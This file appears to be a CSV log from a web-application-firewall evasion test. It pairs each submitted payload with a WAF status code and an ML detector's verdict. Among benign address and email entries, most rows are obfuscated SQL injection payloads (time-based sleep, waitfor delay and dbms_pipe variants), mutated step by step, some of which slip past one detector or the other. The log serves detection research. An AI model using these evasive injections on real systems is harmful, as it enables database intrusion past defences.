Timestamp,Payload,WAF_Prediction_Timestamp,WAF_Prediction,ML_Prediction_Timestamp,ML_Prediction
2024-09-04T09:42:17.410117,hontangas,2024-09-04T09:42:17.414526,200,2024-09-04T09:42:17.884770,Accepted
2024-09-04T09:42:18.892380,"inocencia alayon, s/n 4-f",2024-09-04T09:42:18.896090,200,2024-09-04T09:42:20.163187,Accepted
2024-09-04T09:42:20.174280,"inocencia/**/alayon,	s/n (sELEct 9331 lIKE  AND 1)-f",2024-09-04T09:42:20.179664,200,2024-09-04T09:42:23.084160,Accepted
2024-09-04T09:42:24.096656,"inocencia/**/alayon,
s/n (SELeCT/**/ anD (SeleCt 1) lIke  aND 'w' Like 'w')-f",2024-09-04T09:42:24.100883,200,2024-09-04T09:42:28.910169,Accepted
2024-09-04T09:42:29.929690,"inocencia/*lR*/alayon, s/n (SeLECt  And (sELECT (SELECT  AND 1)=7523) LikE  AnD 'w' lIKE 'w')-f",2024-09-04T09:42:29.935485,200,2024-09-04T09:42:35.570698,Rejected
2024-09-04T09:42:36.584165,"inocencia/*A9W*/alayon,	s/n (SELECt  aNd (sELect (selEct  aNd/**/(SELECT 1)) LIke  oR 'Wg'='Wg') lIke  aNd 'w' like 'w')-f",2024-09-04T09:42:36.589188,200,2024-09-04T09:42:43.646574,Rejected
2024-09-04T09:42:44.660895,"inocencia/**/alayon,	s/n (SElEct  AnD (seLECt (select  and (SELEcT (SeLect  AND '>O' NOT LIKE '>OL'))) LIke 	Or 'Wg' like 'Wg') liKE  aND 'w' lIKe 'w')-f",2024-09-04T09:42:44.665676,200,2024-09-04T09:42:52.990163,Rejected
2024-09-04T09:42:54.005713,"inocencia/**/alayon, s/n (SELeCT  AnD (seLECT (SELeCt/**/ anD (SeLeCt (selEcT  anD '>O' NOT LIKE '>OL'))) likE 	Or (SELECT 0x1)) Like  and 'H}'!='H}B')-f",2024-09-04T09:42:54.009781,200,2024-09-04T09:43:02.118654,Rejected
2024-09-04T09:43:03.135872,"inocencia/**/alayon, s/n (SELecT  aNd (seLECT (SEleCT/*0*/ aNd (sElect (selecT  anD '>O' NOT LIKE '>OL'))) LikE  OR (seLecT 0x1))/**/lIKe  and 'H}' not like 'H}B')-f",2024-09-04T09:43:03.140544,200,2024-09-04T09:43:10.301941,Rejected
2024-09-04T09:43:11.317725,"inocencia/*kHc*/alayon, s/n/**/(seLecT  AND (SELeCT (seLect/**/ AnD (sEleCT
(SELECT  AND '>O' not like '>OL'))) LIkE  oR (SelECt 0x1))/**/LiKE  aNd 'H}' not like 'H}B')-f",2024-09-04T09:43:11.321039,403,2024-09-04T09:43:18.303447,Rejected
2024-09-04T09:43:19.317750,"inocencia/**/alayon, s/n (sElect  aND (sELeCT (sELeCt/**/ aND (seLecT (Select  ANd '>O' not like '>OL'))) LIkE  or (Select 0x1))/**/LikE  aNd 'H}' not like 'H}B')-f",2024-09-04T09:43:19.322531,200,2024-09-04T09:43:26.584995,Accepted
2024-09-04T09:43:27.599528,"inocencia/**/alayon, s/n	(selecT  aNd (seLeCt (SeLect/**/ anD (SeLEcT (Select  aNd '>O' not like '>OL'))) LIkE  or (SElEcT 0x1)) LIKE  And 'H}' not like 'H}B')-f",2024-09-04T09:43:27.603480,200,2024-09-04T09:43:34.691024,Rejected
2024-09-04T09:43:35.698707,"obispo diego aponte, s/n",2024-09-04T09:43:35.703234,200,2024-09-04T09:43:36.763826,Accepted
2024-09-04T09:43:36.772042,"obispo
diego aponte,/**/s/n",2024-09-04T09:43:36.776461,200,2024-09-04T09:43:38.009842,Accepted
2024-09-04T09:43:39.024038,"obispo	diego/**/aponte,/*E|*/s/n",2024-09-04T09:43:39.029123,200,2024-09-04T09:43:40.436539,Accepted
2024-09-04T09:43:41.449537,"obispo
diego aponte,/*E|*/s/n",2024-09-04T09:43:41.454059,200,2024-09-04T09:43:42.743177,Accepted
2024-09-04T09:43:43.754271,"obispo	diego/*ny)6*/aponte,/*E|*/s/n",2024-09-04T09:43:43.758929,200,2024-09-04T09:43:45.403087,Accepted
2024-09-04T09:43:46.418270,"obispo
diego/*ny)0x6*/aponte,/*E|*/s/n",2024-09-04T09:43:46.424562,200,2024-09-04T09:43:48.100928,Accepted
2024-09-04T09:43:49.111467,"obispo/**/diego/*ny)0x6*/aponte,/*E|*/s/n",2024-09-04T09:43:49.117278,200,2024-09-04T09:43:50.950825,Accepted
2024-09-04T09:43:51.961512,"obispo	diego/*ny)0x6*/aponte,/*E|*/s/n",2024-09-04T09:43:51.966924,200,2024-09-04T09:43:53.605077,Accepted
2024-09-04T09:43:54.618405,"obispo
diego/*ny)0x6*/aponte,/*E|*/s/n",2024-09-04T09:43:54.622521,200,2024-09-04T09:43:56.337294,Accepted
2024-09-04T09:43:57.347624,"obispo/**/diego/*ny)0x6*/aponte,/*E|*/s/n",2024-09-04T09:43:57.351365,200,2024-09-04T09:43:59.801784,Accepted
2024-09-04T09:44:00.811567,"obispo/*K-*/diego/*ny)0x6*/aponte,/*E|*/s/n",2024-09-04T09:44:00.817890,200,2024-09-04T09:44:02.866058,Accepted
2024-09-04T09:56:22.011945,vingelli9@custombikesclothes.fr,2024-09-04T09:56:22.020429,200,2024-09-04T09:56:23.990999,Accepted
2024-09-04T09:56:23.999341,vingelli9@custombikesclothes.fr,2024-09-04T09:56:24.003983,200,2024-09-04T09:56:25.331334,Accepted
2024-09-04T09:56:26.339771,vingelli9@custombikesclothes.fr,2024-09-04T09:56:26.344442,200,2024-09-04T09:56:27.749764,Accepted
2024-09-04T09:56:28.760771,vingelli9@custombikesclothes.fr,2024-09-04T09:56:28.767000,200,2024-09-04T09:56:30.079503,Accepted
2024-09-04T09:56:31.087683,vingelli9@custombikesclothes.fr,2024-09-04T09:56:31.093706,200,2024-09-04T09:56:32.398133,Accepted
2024-09-04T09:56:33.406646,vingelli9@custombikesclothes.fr,2024-09-04T09:56:33.410854,200,2024-09-04T09:56:34.754137,Accepted
2024-09-04T09:56:35.764567,vingelli9@custombikesclothes.fr,2024-09-04T09:56:35.770729,200,2024-09-04T09:56:37.064390,Accepted
2024-09-04T09:56:38.073248,vingelli9@custombikesclothes.fr,2024-09-04T09:56:38.077842,200,2024-09-04T09:56:39.454079,Accepted
2024-09-04T09:56:40.467128,vingelli9@custombikesclothes.fr,2024-09-04T09:56:40.473199,200,2024-09-04T09:56:41.945649,Accepted
2024-09-04T09:56:42.953209,vingelli9@custombikesclothes.fr,2024-09-04T09:56:42.957040,200,2024-09-04T09:56:44.302454,Accepted
2024-09-04T09:56:45.312079,vingelli9@custombikesclothes.fr,2024-09-04T09:56:45.316941,200,2024-09-04T09:56:46.672250,Accepted
2024-09-04T09:56:47.680417,"1"""") where 9962=9962 and 4595=4595#",2024-09-04T09:56:47.685764,200,2024-09-04T09:56:49.173721,Rejected
2024-09-04T09:56:49.182779,"1"""")
wHERe (SELECT 9962) like 9962/**/and ','=','=(SELECT 1)#'m",2024-09-04T09:56:49.187158,200,2024-09-04T09:56:52.073562,Rejected
2024-09-04T09:56:53.087205,"';' liKe ';'"""")
wHeRe (seLecT 9962) liKe/**/9962/**/anD
','=',' liKE (selECT (select (sEleCt 1)))#'m",2024-09-04T09:56:53.099462,403,2024-09-04T09:56:57.823544,Accepted
2024-09-04T09:56:58.838097,"';' LiKe ';'"""")
wHeRE (SELEct (SELECT 1)) lIke/*(Y{h2*/0x26ea/**/aNd	',' LIkE ',' like (SEleCt (SeLecT (SElECT 'aS'/**/lIKE 'aS')))#'m",2024-09-04T09:56:58.841459,403,2024-09-04T09:57:05.358510,Accepted
2024-09-04T09:57:06.377573,"';' liKE ';'"""")
wHeRe (SELeCt	(SeLecT 0x1)) LiKe/*(Y{h2*/0x26ea aNd	',' LiKE ',' liKE (SeLECT (sElEct (SELECT 'aS'/*8Oul*/lIKE 'aS')))#'m",2024-09-04T09:57:06.382089,403,2024-09-04T09:57:12.820924,Accepted
2024-09-04T09:57:13.835991,"';' LIkE ';'"""")
WHere (SeLect (SElecT 0x1)) liKe/*(Y{h2*/0x26ea aNd	',' LiKe ',' likE (SeLeCT (selECT (selECt/**/'aS'/**/lIKe 'aS')))#'m&0",2024-09-04T09:57:13.839377,403,2024-09-04T09:57:21.251909,Accepted
2024-09-04T09:57:22.267942,"';' LIke ';'"""") WHEre (selEct (SelEct 0x1))/**/liKE/*(Y{h2*/0x26ea and	',' LiKe ',' LikE (SELEcT (SeLecT (SELECt/**/'aS'/**/like 'aS')))#'m&0x6",2024-09-04T09:57:22.272727,403,2024-09-04T09:57:30.169769,Rejected
2024-09-04T09:57:31.183675,"';' liKe ';'"""") WHeRe (sElecT (selEcT 0x1)) LiKe/*(Y{h2*/0x26ea aNd
',' like ',' LiKE (SElECt (select (SELECT/**/'aS'/*z*/LiKE 'aS')))#'m&0x6",2024-09-04T09:57:31.188487,403,2024-09-04T09:57:40.374017,Rejected
2024-09-04T09:57:41.392054,"';' lIke ';'"""") WhEre (SElecT (SELECt 0x1)) like/*(Y{h2*/0x26ea And	',' lIKE ',' LIKe/**/(sELecT (seLEcT (seLEct/**/'aS'/**/likE 'aS')))#'m&0x6Q",2024-09-04T09:57:41.398193,403,2024-09-04T09:57:56.123693,Accepted
2024-09-04T09:57:57.140826,"';' LIKE ';'"""") whERe (SElECt (SELECt 0x1))/**/LiKE/*(Y{h2*/0x26ea AnD	',' LiKE	',' LIKe/**/(SeleCT (selEct (SElECt/**/'aS'/**/lIkE 'aS')))#'m&0x6QE|",2024-09-04T09:57:57.147364,403,2024-09-04T09:58:07.840652,Rejected
2024-09-04T09:58:08.854071,"';' lIkE ';'"""") WHERE (sELecT (SELECt 0x1))/**/LiKe/*(Y{h2*/0x26ea aND
',' LIkE	',' Like/*25v*/(sELeCT (seleCT (SeLEcT/**/'aS' LIke 'aS')))#'m&0x6QE|",2024-09-04T09:58:08.858086,403,2024-09-04T09:58:18.215909,Accepted
2024-09-04T09:58:19.227738,riudellots de la selva,2024-09-04T09:58:19.234865,200,2024-09-04T09:58:21.402370,Accepted
2024-09-04T09:58:21.416037,"riudellots
de la/**/selva",2024-09-04T09:58:21.424564,200,2024-09-04T09:58:24.477818,Accepted
2024-09-04T09:58:25.489252,riudellots de/**/la/**/selva,2024-09-04T09:58:25.494458,200,2024-09-04T09:58:27.343351,Accepted
2024-09-04T09:58:28.353738,riudellots	de/*'*/la selva,2024-09-04T09:58:28.359027,200,2024-09-04T09:58:30.278764,Accepted
2024-09-04T09:58:31.290415,riudellots	de/*e3P2*/la	selva,2024-09-04T09:58:31.297402,200,2024-09-04T09:58:33.222821,Accepted
2024-09-04T09:58:34.235592,"riudellots
de/*_j~v*/la	selva",2024-09-04T09:58:34.241479,200,2024-09-04T09:58:35.945195,Accepted
2024-09-04T09:58:36.954284,"riudellots
de/*Cq.*/la/**/selva",2024-09-04T09:58:36.958491,200,2024-09-04T09:58:38.528548,Accepted
2024-09-04T09:58:39.540504,"riudellots
de
la/**/selva",2024-09-04T09:58:39.545465,200,2024-09-04T09:58:40.719846,Accepted
2024-09-04T09:58:41.734400,"riudellots de
la selva",2024-09-04T09:58:41.739153,200,2024-09-04T09:58:42.719843,Accepted
2024-09-04T09:58:43.737753,riudellots de	la/*Mr: AND 1*/selva,2024-09-04T09:58:43.741962,200,2024-09-04T09:58:45.195774,Accepted
2024-09-04T09:58:46.206915,"riudellots/*Gkl*/de
la/**/selva",2024-09-04T09:58:46.211799,200,2024-09-04T09:58:47.541051,Accepted
2024-09-04T09:58:48.548879,"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('aatp'='aatp",2024-09-04T09:58:48.552324,403,2024-09-04T09:58:53.299954,Rejected
2024-09-04T09:58:53.306896,"1')));select/**/dbms_pipe.receive_message(chr(66)||chr(965!= OR 0)||chr(79)||chr(0x65),5) from	dual and ((('aatp'='aatp",2024-09-04T09:58:53.309879,403,2024-09-04T09:58:57.862436,Accepted
2024-09-04T09:58:58.871600,"1')));select/**z84*/dbms_pipe.receive_message(chr(66)||chr((SELECT 1)!= OR/**/0)||chr((SELECT 79))||chr(0x65),9828=9828) from dual and ((('aatp'='aatp",2024-09-04T09:58:58.876121,403,2024-09-04T09:59:05.078385,Rejected
2024-09-04T09:59:06.086639,"1')));select/**z84*/dbms_pipe.receive_message(chr((SELECT 66))||chr((SELECT (SELECT 1))!= OR 0)||chr((SELECT 79))||chr(0x65),9828='`' LIKE '`') from dual	and ((('aatp'='aatp",2024-09-04T09:59:06.090912,403,2024-09-04T09:59:12.776555,Rejected
2024-09-04T09:59:13.787764,"(sELEcT 5560 IN (5559,5560,5561))')));select/**z84*/dbms_pipe.receive_message(chr((SELECT/**/66))||chr((SELECT (SELECT 1))!= OR 0)||chr((SELECT (SELECT 79)))||chr(0x65),9828='`' LIKE '`') from dual and ((('aatp'='aatp",2024-09-04T09:59:13.791558,403,2024-09-04T09:59:22.148313,Rejected
2024-09-04T09:59:23.161631,"(sElEct 5560 In (5559,5560,(SELECT 5561)))')));select/**z84*/dbms_pipe.receive_message(chr((SELECT/**/ AND 1))||chr((SELECT (SELECT
'o;$'<>'o;$^'))!= OR 0)||chr((SELECT (SELECT 79)))||chr(0x65),9828='`' LIKE '`') from dual/*%|8A*/and ((('aatp'='aatp",2024-09-04T09:59:23.165899,403,2024-09-04T09:59:33.094898,Rejected
2024-09-04T09:59:34.114664,"(SElEct/**/5560 In ((SELECT 5559),(SELECT 1),(SelecT	'U!d7\'!='U!d7\,')))')));SelEcT/**z84*/dbms_pipe.receive_message(chr((sElecT/**/ aND 1))||chr((SeleCt (seLEct
'o;$'<>'o;$^'))!= OR 0)||chr((SelECt (SELECT 79)))||chr(0x65),9828='`' LIKE '`') froM dual/*%|8A*/anD ((('aatp'='aatp",2024-09-04T09:59:34.118958,403,2024-09-04T09:59:45.085485,Rejected
2024-09-04T09:59:46.101677,"(seLeCT/**/5560 iN ((SeLECt 5559),(SELeCT 0x1),(sELEct
'U!d7\'!='U!d7\,')))')));sELeCt/**z84*/dbms_pipe.receive_message(chr((SeLECt/**/ AnD 1)) OR/**/chr((sELECt (sELect
'o;$'<>'o;$^'))!= OR 0)||chr((seLEct (seLEcT '=' lIKe '=')))||chr(0x65), AND 1='`' LiKe '`') FroM dual/*%|8A*/anD ((('aatp'='aatp",2024-09-04T09:59:46.105067,403,2024-09-04T09:59:57.779461,Accepted
2024-09-04T09:59:58.802210,"(sELeCt/**/'%W('!='%W(h'
in ((SElEcT (SELECT 5559)),(sElect 0x1),(sELECt
'U!d7\'!='U!d7\,')))')));SELect/**z84*/dbms_pipe.receive_message(chr((SElECT/*ap=j	*/ anD  AND 1)) or chr((SEleCt (SeLECT
'o;$' NOT LIKE 'o;$^'))!= or 0)||chr((seLECt (SElEcT '=' liKE '=')))||chr(0x65), aNd 1='`' likE '`') fROM dual/*%|8A*/aND ((('aatp'='aatp",2024-09-04T09:59:58.806613,403,2024-09-04T10:00:14.216633,Rejected
2024-09-04T10:00:15.236450,"(seLect/**/'%W('!='%W(h'
in ((SElEct (seLeCt 0x15b7)),(sElECt 0x1),(select
'U!d7\'!='U!d7\,')))')));Select/**z84*/dbms_pipe.receive_message(chr((sElEct/*ap=j	*/ AND  anD (SelECT 'B'<>'BJ'))) Or chr((selecT (selEcT
'o;$' NOT/**/lIKe 'o;$^'))<> oR 0)||chr((SeLect (seleCT '=' LikE	'=')))||chr(0x65), AnD 1='`' LiKe '`') froM dual/*%|8A*/aNd ((('aatp'='aatp",2024-09-04T10:00:15.240379,403,2024-09-04T10:00:30.711986,Accepted
2024-09-04T10:00:31.732637,"(seLECt '%W('!='%W(h' iN ((selECT (SELEct 0x15b7)),(SElECT 0x1),(seLeCt
'U!d7\'!='U!d7\,')))')));sEleCT/**z84*/dbms_pipe.receive_message(chr((seLECT/*J^id*/ AND  and (seleCT 'B' not like 'BJ'))) OR chr((SELeCT (SELEcT
'o;$' NOT/**/LikE 'o;$^'))<> OR 0)||chr((sELeCt (sElECT '=' lIke	'=')))||chr(0x65), AND 1727 LIKE (SELECT (SELECT 1))='`' LiKe '`') fRom dual/*%|8A*/and ((('aatp'='aatp",2024-09-04T10:00:31.736342,403,2024-09-04T10:00:46.700530,Rejected
2024-09-04T10:00:47.707976,1)) as pynj where 7683=7683 waitfor delay '0:0:5'--,2024-09-04T10:00:47.711554,403,2024-09-04T10:00:49.992858,Rejected
2024-09-04T10:00:49.999947,"1)) AS pynj WhERe 7683 LIKE 7683 waitfor/**/delay '0:(SELECT 3975
IN (3974,3975,3976)):(SELECT 5)'--",2024-09-04T10:00:50.003398,403,2024-09-04T10:00:54.072729,Rejected
2024-09-04T10:00:55.082127,"1)) As pynj WHerE 7683
lIkE 7683 waitfor delay '0:(SELECT 3975
IN ((SELECT  AND 1),5204=5204,3976)):(SELECT 5)'--",2024-09-04T10:00:55.084967,403,2024-09-04T10:01:00.254122,Rejected
2024-09-04T10:01:01.264957,"1)) AS	pynj WheRe 7683
lIKE 7683 waitfor delay '0:(SELECT 3975
IN ((SELECT  AND (SELECT 1)),5204=7093=7093,3976)):(SELECT/**/0x5)'--",2024-09-04T10:01:01.270553,403,2024-09-04T10:01:07.198966,Rejected
2024-09-04T10:01:08.210318,"1)) As	pynj wHerE 7683
LIke 7683 waitfor delay '0:(SELECT 3975
IN/**/((SELECT	 AND (SELECT 1)),0x1454=7093=7093, OR '3f'!='3fh')):(SELECT/**/0x5)'--",2024-09-04T10:01:08.213454,403,2024-09-04T10:01:15.353984,Rejected
2024-09-04T10:01:16.366217,"1)) As	pynj wheRe 7683
lIkE 0x1e03 waitfor delay '0:(SELECT 3975
IN/**/((SELECT  AND (SELECT 1)),0x1454=8036 IN ( OR 0,8036,8037)=7093, OR '3f'!='3fh')):(SELECT 0x5)'--",2024-09-04T10:01:16.372252,403,2024-09-04T10:01:24.093817,Rejected
2024-09-04T10:01:25.110095,"1))	As	pynj wHERe 7683
like 0x1e03 waitfor delay '0:(SELECT 1140=(SELECT 1)
IN/*=j)*/((SELECT  AND (SELECT 1)),0x1454=(SELECT 8036) IN/**/( OR 0,8036,8037)=7093, OR '3f'!='3fh')):(SELECT 0x5)'--",2024-09-04T10:01:25.114259,403,2024-09-04T10:01:34.137188,Rejected
2024-09-04T10:01:35.149389,"OR 0)) As	pynj whEre 7683
liKE 0x1e03 waitfor delay ''N'<>'N}':(SELECT/**/1140=(SELECT 1)
IN/*=j)*/((SELECT  AND (SELECT (SELECT 1))),0x1454=(SELECT 8036) IN/*@c'*/( OR 0,8036,8037)=7093, || '3f'!='3fh')):(SELECT 0x5)'--",2024-09-04T10:01:35.154453,200,2024-09-04T10:01:45.347443,Rejected
2024-09-04T10:01:46.359395,"or  OR 'HH'<>'HHP')) AS	pynj whERE 7683
lIKe 0x1e03 waitfor delay ''N'<>'N}':(SELECT 1140=(SELECT 1)
IN/*=j)*/((SELECT  AND (SELECT (SELECT
1))),0x1454=(SELECT 8036) IN/*@c'*/( OR 0,0x1f64,8037)=7093, || '3f'!='3fh')):(sELECt 0x5)'--",2024-09-04T10:01:46.363521,200,2024-09-04T10:01:55.132158,Rejected
2024-09-04T10:01:56.143515,"oR  Or 'HH' not like 'HHP')) as	pynj WHEre 7683	liKe 0x1e03 waitfor/*4nN.*/delay ''N'<>'N}':(SELECT 0x474=(SELECT 1)
IN/*=j)*/((SELECT  AND (SELECT (SELECT
1))),0x1454=(SELECT 8036) IN/**/( OR 'qw' LIKE 'qw',0x1f64,8037)=(SELECT 1), || '3f'!='3fh')):(sELECt 0x5)'--",2024-09-04T10:01:56.148344,200,2024-09-04T10:02:06.589051,Rejected
2024-09-04T10:02:07.608687,"or  or 'HH' not like 'HHP')) as	pynj wherE 7683	lIkE 0x1e03 waitfor/*4nN.*/delay ''N'<>'N}':(SELECT 0x474=(SELECT (SELECT 6881) IN (6880,6881,6882)) IN/*=j)*/((SELECT  AND (SELECT (SELECT
1))),0x1454=(SELECT  OR 0) IN/**/( OR/*LX4jr*/'qw' LIKE 'qw',0x1f64,8037)=(SELECT 1), || '3f'!='3fh')):(sELECt 0x5)'--",2024-09-04T10:02:07.616551,200,2024-09-04T10:02:20.534317,Rejected
2024-09-04T10:02:21.552692,1) where 2734=2734 waitfor delay '0:0:5'--,2024-09-04T10:02:21.567752,403,2024-09-04T10:02:23.509700,Rejected
2024-09-04T10:02:23.518059,1) whERe 2734 LikE /**/Or 0 waitfor delay	'0x0:'UR' NOT LIKE 'URd':5'--,2024-09-04T10:02:23.522473,403,2024-09-04T10:02:26.387532,Rejected
2024-09-04T10:02:27.398915,"(sEleCT  OR 0)) wHerE 'QDV'!='QDV""' like/**//**/OR 0 waitfor delay '0x0:'UR' NOT LIKE 'URd':5'--",2024-09-04T10:02:27.402480,403,2024-09-04T10:02:31.194349,Rejected
2024-09-04T10:02:32.211202,"(seLECT  oR 0)) Where 'QDV' NOT LIKE 'QDV""' LIKe/**/ oR  or	0x0 waitfor delay '0x0:'UR' NOT LIKE 'URd':'VO'='VO''--",2024-09-04T10:02:32.215550,403,2024-09-04T10:02:36.806217,Rejected
2024-09-04T10:02:37.818443,"(sElect  Or 'a6~'<>'a6~z')) whEre 'QDV' not like 'QDV""' lIke/**/ or  oR
0x0 waitfor delay/*&a:j**/'0x0:'UR' NOT LIKE 'URd': AND 0x1'--",2024-09-04T10:02:37.822772,403,2024-09-04T10:02:43.739132,Rejected
2024-09-04T10:02:44.749586,"(SeLeCT  Or 'a6~'!='a6~z')) WHeRe 'QDV' not like 'QDV""' LiKe  or  or
0x0 waitfor delay/*&a:j**/'0x0:'UR'	NOT LIKE 'URd': AND 0x1'--",2024-09-04T10:02:44.754736,403,2024-09-04T10:02:51.021164,Rejected
2024-09-04T10:02:52.036883,"(SElECt  or 'a6~'/**/NOT LIKE 'a6~z')) wHeRe 'QDV' not like 'QDV""' Like  oR  Or
0x0 waitfor
delay/*&a:j**/'0x0:'UR'	NOT LIKE 'URd': AND 0x1'--",2024-09-04T10:02:52.043156,403,2024-09-04T10:02:57.860530,Rejected
2024-09-04T10:02:58.877442,"(sELEct  or 'a6~'/*:)51""*/NOT LIKE/**/'a6~z')) WhErE 'QDV' not like 'QDV""' LikE  or  ||
0x0 waitfor
delay/*&a:j**/'0x0:'UR' NOT LIKE 'URd': AND 0x1'--",2024-09-04T10:02:58.881212,403,2024-09-04T10:03:04.910166,Rejected
2024-09-04T10:03:05.927840,"(SelECT  oR 'a6~'/*:) AND 0x1""*/not like/**/'a6~z')) WHeRe 'QDV' not	like 'QDV""' lIKe  or  ||
0x0 waitfor
delay/*&a:j**/'0x0:'UR' NOT/**/LIKE 'URd': AND 0x1'--",2024-09-04T10:03:05.931658,403,2024-09-04T10:03:12.544133,Accepted
2024-09-04T10:03:13.559783,"(seLecT  oR 'a6~'/*:) AND 0x1""*/not like 'a6~z')) wHeRE 'QDV' not	like 'QDV""' LiKE  OR   OR 	0x0 waitfor
delay/*&a:j**/'0x0:'UR' NOT/**/LIKE 'URd': AND 0x1'--",2024-09-04T10:03:13.563300,403,2024-09-04T10:03:19.490957,Accepted
2024-09-04T10:03:20.503445,"(sELeCT  Or 'a6~'/*:) AND 0x1""*/not like	'a6~z')) WHeRE 'QDV' not	like 'QDV""' lIKe/**/ or   oR 	0x0 waitfor
delay/*&a:j**/'0x0:'UR' NOT/*Sk*/LIKE 'URd': AND 0x1'--",2024-09-04T10:03:20.507745,403,2024-09-04T10:03:26.859343,Accepted
2024-09-04T10:03:27.871283,"1"""") rlike (select * from (select(sleep(5)))sgvo) and (""""fkmh""""=""""fkmh",2024-09-04T10:03:27.876513,403,2024-09-04T10:03:30.900642,Rejected
2024-09-04T10:03:30.911254,"1"""") rlike (selECT/**/*	FRom (SelEct(sleep((seLeCT  OR 9201 LIKE 9201))))sgvo) AND (""""fkmh"""" LIKE """"fkmh",2024-09-04T10:03:30.916138,200,2024-09-04T10:03:35.642038,Rejected
2024-09-04T10:03:36.659654,"1"""") rlike (SElEct/**/* FrOm (sElECt(sleep((select  ||/*HUa1*/'#' NOT LIKE '#s' like  Or 0x0))))sgvo) aND (""""fkmh"""" LiKe """"fkmh",2024-09-04T10:03:36.664750,200,2024-09-04T10:03:41.536034,Rejected
2024-09-04T10:03:42.567686,"(SElECT 0x45e<>1119)"""") rlike (SELECt * FROm (SeLECT(sleep((SELECt  ||/**/'#'	not like '#s' Like  OR 0x0))))sgvo) ANd (""""fkmh"""" lIke """"fkmh",2024-09-04T10:03:42.572876,403,2024-09-04T10:03:47.885031,Rejected
2024-09-04T10:03:48.900286,"(sElecT 0x45e NOT LIKE /**/AND 'V'='V')"""") rlike (SelECt * FROM (SelECT(sleep((SelECT  ||/*CbbX*/'#'	not like '#s' LikE  oR 0x0))))sgvo) aND (""""fkmh"""" likE	""""fkmh",2024-09-04T10:03:48.903892,403,2024-09-04T10:03:55.428351,Rejected
2024-09-04T10:03:56.445816,"(sELECT 0x45e NOT LIKE /**/aND  OR '25'!='25j')"""") rlike (selECT * FROM (selecT(sleep((sELEcT  ||/*CbbX*/'#'	not like '#s' LIkE  Or 0x0))))sgvo) ANd/**/(""""fkmh"""" lIKE
""""fkmhg",2024-09-04T10:03:56.450017,403,2024-09-04T10:04:03.142415,Rejected
2024-09-04T10:04:04.162967,"(seLEct 0x45e not like /**/AnD  OR ' OR 4834!=0x12e3'!='25j')"""") rlike (SeLEcT */**/frOm (seLeCT(sleep((SeLEct  ||/*CbbX*/'#'	not like '#s' LIKe	 Or 0x0))))sgvo) ANd/**/(""""fkmh"""" lIKE
""""fkmhg",2024-09-04T10:04:04.166360,403,2024-09-04T10:04:11.429612,Accepted
2024-09-04T10:04:12.444897,"(sEleCT 0x45e not like  aNd  or ' OR (SELECT 0x1)!=0x12e3'<>'25j')"""") rlike (sElect */**/from (SElecT(sleep((sElect  ||/**/'#'	not like '#s' LIKE	 oR 0x0))))sgvo)
and/**/(""""fkmh"""" LikE
""""fkmhg$",2024-09-04T10:04:12.448012,403,2024-09-04T10:04:20.418986,Accepted
2024-09-04T10:04:21.439713,"(SelecT 0x45e not/**/like  and  OR ' OR (SELECT 0x1)!=0x12e3'<>'25j')"""") rlike (seLEcT */**/FroM (sELeCt(sleep((Select  ||/**/'#'	not like '#s' LIkE  oR 0x0))))sgvo)
AnD/**/(""""fkmh"""" LIKE
""""fkmhg$oU",2024-09-04T10:04:21.442939,403,2024-09-04T10:04:29.030332,Accepted
2024-09-04T10:04:30.046271,"(seLect 0x45e not/**/liKe  aNd  oR ' OR (SELECT 0x1)!=0x12e3' not like '25j')"""") rlike (SelECT * fRom (SElect(sleep((selECt  ||/**/'#'	not like '#s' lIKe	 Or 0x0))))sgvo)
And/**/(""""fkmh"""" LIkE
""""fkmhg$oUw",2024-09-04T10:04:30.049840,403,2024-09-04T10:04:38.300598,Accepted
2024-09-04T10:04:39.316324,"(sEleCT 0x45e not/**/lIkE  ANd  OR ' OR (SELECT 0x1)!=0x12e3' not like '25j')"""") rlike (SElECT * frOM (SEleCT(sleep((SelEct  ||/**/'#'	not like '#s' LikE	 Or 0x0))))sgvo)	anD (""""fkmh"""" LIKe
""""fkmhg$oUwe:",2024-09-04T10:04:39.321326,403,2024-09-04T10:04:47.285866,Rejected
2024-09-04T10:04:48.294839,benson-rabasa@mareventsprotocolosocial.ad,2024-09-04T10:04:48.299580,200,2024-09-04T10:04:49.965150,Accepted
2024-09-04T10:04:49.972970,benson-rabasa@mareventsprotocolosocial.ad,2024-09-04T10:04:49.976776,200,2024-09-04T10:04:51.588634,Accepted
2024-09-04T10:04:52.597155,benson-rabasa@mareventsprotocolosocial.ad,2024-09-04T10:04:52.601713,200,2024-09-04T10:04:54.204465,Accepted
